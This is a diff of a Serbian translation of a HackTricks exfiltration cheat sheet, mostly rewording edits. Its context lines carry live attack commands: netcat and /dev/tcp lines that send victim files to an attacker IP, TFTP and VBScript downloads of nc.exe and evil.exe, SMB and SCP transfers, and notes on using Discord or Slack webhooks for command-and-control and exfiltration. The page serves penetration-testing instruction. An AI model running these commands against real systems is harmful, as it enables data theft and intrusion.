@@ -2,9 +2,16 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Često whitelisted domene za exfiltrate informacija
+> [!TIP]
+> Za end-to-end primer staging loota u `C:\Users\Public` i exfiltrating pomoću Rclone kako bi se oponašali legitimni backups, pregledajte workflow ispod.
 
-Proverite [https://lots-project.com/](https://lots-project.com/) da pronađete domene koji su često whitelisted i koje je moguće zloupotrebiti
+{{#ref}}
+../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
+{{#endref}}
+
+## Domeni koji se često nalaze na whitelisti za exfiltrate informacije
+
+Posetite [https://lots-project.com/](https://lots-project.com/) da pronađete domene koji su često whitelisted i koji se mogu zloupotrebiti
 
 ## Copy\&Paste Base64
 
@@ -100,9 +107,9 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
-## Webhooks (Discord/Slack/Teams) za C2 & Data Exfiltration
+## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
 
-Webhooks su write-only HTTPS endpoints koji prihvataju JSON i opciono file parts. Često su dozvoljeni za trusted SaaS domene i ne zahtevaju OAuth/API ključeve, što ih čini korisnim za low-friction beaconing i exfiltration.
+Webhooks su write-only HTTPS endpointi koji prihvataju JSON i opciono file delove. Obično su dozvoljeni za pouzdane SaaS domene i ne zahtevaju OAuth/API ključeve, što ih čini korisnim za low-friction beaconing i exfiltration.
 
 Key ideas:
 - Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
@@ -178,8 +185,8 @@ Start-Sleep -Seconds 20
 }
 ```
 Beleške:
-- Slični obrasci važe i za druge platforme za saradnju (Slack/Teams) koje koriste svoje incoming webhooks; prilagodite URL i JSON šemu u skladu s tim.
-- Za DFIR vezan za artefakte keša Discord Desktop-a i webhook/API recovery, pogledajte:
+- Slični obrasci važe i za druge platforme za saradnju (Slack/Teams) koje koriste njihove incoming webhooks; prilagodite URL i JSON schema u skladu.
+- Za DFIR vezano za artefakte keša Discord Desktop i oporavak webhook/API, pogledajte:
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
@@ -235,7 +242,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Ili kreirajte smb share **koristeći samba**:
+Ili kreiraj smb share **koristeći samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -260,13 +267,13 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-attacker mora imati SSHd pokrenut.
+Napadač mora da ima SSHd pokrenut.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Ako žrtva ima SSH, napadač može da montira direktorijum sa žrtve na svoj sistem.
+Ako žrtva ima SSH, napadač može montirati direktorijum sa žrtve na svoju mašinu.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -279,19 +286,19 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Preuzimanje datoteke sa žrtve
+### Preuzimanje fajla sa victim
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Otpremanje datoteke na metu
+### Otpremanje fajla na žrtvu
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-zahvaljujući **@BinaryShadow\_**
+Zahvaljujući **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -313,15 +320,15 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Ako možete poslati podatke na SMTP server, možete kreirati SMTP server za primanje podataka pomoću python:
+Ako možete да поšaljete podatke на SMTP сервер, можете направити SMTP сервер који ће примати податке користећи python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Podrazumevano u XP i 2003 (u ostalim verzijama mora biti eksplicitno dodat tokom instalacije)
+Podrazumevano u XP i 2003 (u ostalim verzijama je potrebno eksplicitno dodati tokom instalacije)
 
-U Kali, **pokrenite TFTP server**:
+U Kali, **pokreni TFTP server**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
@@ -333,7 +340,7 @@ cp /path/tp/nc.exe /tftp
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-Na **victim**, povežite se na Kali server:
+U **victim**, povežite se na Kali server:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
@@ -381,7 +388,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Program `debug.exe` ne samo da omogućava pregled binarnih fajlova, već ima i **sposobnost da ih rekonstruiše iz hex-a**. To znači da, pružanjem hex-a binarnog fajla, `debug.exe` može generisati binarni fajl. Međutim, važno je napomenuti da `debug.exe` ima **ograničenje sastavljanja fajlova do veličine od 64 kb**.
+Program `debug.exe` ne samo da omogućava inspekciju binarnih fajlova već ima i **sposobnost da ih rekonstruiše iz hex**. To znači da, pružanjem hex prikaza binarnog fajla, `debug.exe` može generisati binarni fajl. Međutim, važno je napomenuti da debug.exe ima **ograničenje u sastavljanju fajlova do 64 kb veličine**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
